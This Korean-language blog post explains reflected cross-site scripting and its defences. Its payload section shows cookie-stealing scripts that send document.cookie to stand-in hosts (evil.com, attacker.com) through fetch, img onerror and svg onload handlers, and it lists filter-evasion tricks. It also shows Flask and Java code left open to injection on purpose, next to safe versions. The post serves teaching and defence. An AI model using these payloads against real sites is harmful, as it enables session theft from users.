---
title: "Reflected XSS: 반사형 크로스사이트 스크립팅 완전 분석"
description: "반사형 XSS의 공격 원리와 동작 흐름, 실제 페이로드 예시, 그리고 출력 인코딩·CSP 헤더를 이용한 방어 전략까지 상세히 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-04"
archiveOrder: 1
type: "knowledge"
category: "Security"
tags: ["XSS", "Reflected XSS", "웹 보안", "OWASP", "출력 인코딩", "CSP"]
featured: false
draft: false
---

[지난 글](/posts/websec-xss-overview/)에서 XSS의 세 가지 유형을 개괄적으로 살펴봤습니다. 이번 글에서는 그 중 가장 흔하게 발견되는 **반사형 XSS(Reflected XSS)**를 집중적으로 파헤칩니다. 공격자가 어떻게 악성 URL 하나로 피해자의 쿠키를 탈취하는지, 서버와 브라우저 사이에서 정확히 무슨 일이 벌어지는지 단계별로 추적합니다.

## 반사형 XSS란?

반사형 XSS는 서버가 HTTP 요청에 포함된 입력값을 **그대로 응답에 반사(reflect)** 할 때 발생합니다. 악성 스크립트는 서버에 저장되지 않고 요청과 응답 사이에서 한 번만 실행되기 때문에 "반사형"이라 부릅니다.

전형적인 시나리오는 검색 기능입니다. 사용자가 검색어를 입력하면 서버가 "당신이 검색한 내용: [검색어]" 형태로 응답합니다. 검색어가 HTML 인코딩 없이 그대로 삽입된다면, 검색어 자리에 `<script>` 태그를 넣었을 때 브라우저가 이를 스크립트로 실행합니다.

```
# 정상 요청
GET /search?q=보안

# 공격 요청
GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

## 공격 흐름 단계별 분석

![Reflected XSS 공격 흐름](/assets/posts/websec-xss-reflected-flow.svg)

공격은 세 단계로 전개됩니다.

**1단계 — 악성 URL 생성**: 공격자는 취약한 파라미터에 스크립트를 삽입한 URL을 만듭니다. URL이 길고 이상하게 보일 수 있어서 URL 단축 서비스로 위장하거나, URL 인코딩(`%3Cscript%3E`)으로 숨깁니다.

**2단계 — 피해자 유도**: 공격자는 피싱 이메일, SNS 메시지, 포럼 링크 등을 통해 피해자가 악성 URL을 클릭하도록 유도합니다.

**3단계 — 서버 반사 및 브라우저 실행**: 피해자의 브라우저가 해당 URL로 요청을 보내면, 취약한 서버는 스크립트를 포함한 HTML을 그대로 응답합니다. 브라우저는 이를 서버가 보낸 정상적인 HTML로 인식하고 스크립트를 실행합니다.

## 실제 페이로드 예시

기본 테스트용 페이로드부터 세션 탈취 페이로드까지:

```javascript
// 기본 테스트
<script>alert(document.domain)</script>

// 쿠키 탈취
<script>
  fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
</script>

// img 태그 우회 (script 필터 시)
<img src=x onerror="this.src='https://attacker.com/?c='+document.cookie">

// 이벤트 핸들러 우회
<svg onload="fetch('https://attacker.com/?c='+btoa(document.cookie))">
```

필터를 우회하는 페이로드도 다양합니다. `<SCRIPT>`, `<ScRiPt>`, `<scr\x00ipt>` 등 대소문자 혼합이나 null 바이트 삽입, `javascript:` 프로토콜 활용이 대표적입니다.

## 취약한 코드 vs 안전한 코드

취약한 서버 코드에서는 입력값을 검증이나 인코딩 없이 HTML에 직접 삽입합니다:

```python
# Flask (취약)
@app.route('/search')
def search():
    q = request.args.get('q', '')
    return f'<html><body>결과: {q}</body></html>'

# Flask (안전) — markupsafe 라이브러리 활용
from markupsafe import escape

@app.route('/search')
def search():
    q = request.args.get('q', '')
    return f'<html><body>결과: {escape(q)}</body></html>'
```

```java
// Java Servlet (취약)
String q = request.getParameter("q");
response.getWriter().write("결과: " + q);

// Java Servlet (안전) — OWASP Java Encoder 사용
import org.owasp.encoder.Encode;
response.getWriter().write("결과: " + Encode.forHtml(q));
```

## 방어 전략

![Reflected XSS 방어 기법](/assets/posts/websec-xss-reflected-defense.svg)

**출력 인코딩(Output Encoding)**이 가장 핵심적인 방어책입니다. HTML 컨텍스트에 따라 적절한 인코딩을 적용해야 합니다:

```javascript
// HTML 컨텍스트 인코딩 (DOMPurify 라이브러리)
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(userInput);

// JS 문자열 컨텍스트 인코딩
const jsEncoded = JSON.stringify(userInput); // 따옴표 이스케이프

// URL 컨텍스트 인코딩
const urlEncoded = encodeURIComponent(userInput);
```

**Content Security Policy(CSP)** 헤더는 인라인 스크립트 실행 자체를 차단합니다. XSS 취약점이 존재하더라도 스크립트 실행을 막아 피해를 크게 줄입니다:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

**HttpOnly 쿠키**는 자바스크립트에서 `document.cookie`로 쿠키에 접근하는 것을 차단해, XSS 공격이 성공하더라도 세션 탈취를 방지합니다:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

## 반사형 XSS가 위험한 이유

반사형 XSS는 서버에 아무것도 저장되지 않아 IDS/IPS나 로그 기반 탐지가 어렵습니다. 공격자는 URL을 피해자에게 직접 전달하기만 하면 됩니다. 피해자가 클릭하는 순간 세션 탈취, 악성코드 다운로드 유도, 피싱 페이지 표시, 키로거 삽입 등 다양한 공격이 가능합니다.

특히 `document.referrer`, `location.href`, `URLSearchParams` 등 JavaScript API로 URL 파라미터를 읽어 DOM에 삽입하는 코드는 서버를 거치지 않는 **DOM 기반 XSS** 변형도 만들어내므로 클라이언트 코드도 철저히 검토해야 합니다.

반사형 XSS를 완전히 차단하려면 출력 인코딩을 기본값으로, CSP와 HttpOnly 쿠키를 중첩 방어로 적용하는 **심층 방어(Defense in Depth)** 전략이 필수입니다.

---

**지난 글:** [XSS 개요: 크로스사이트 스크립팅의 모든 것](/posts/websec-xss-overview/)

**다음 글:** [Stored XSS: 저장형 크로스사이트 스크립팅](/posts/websec-xss-stored/)

<br>
읽어주셔서 감사합니다. 😊
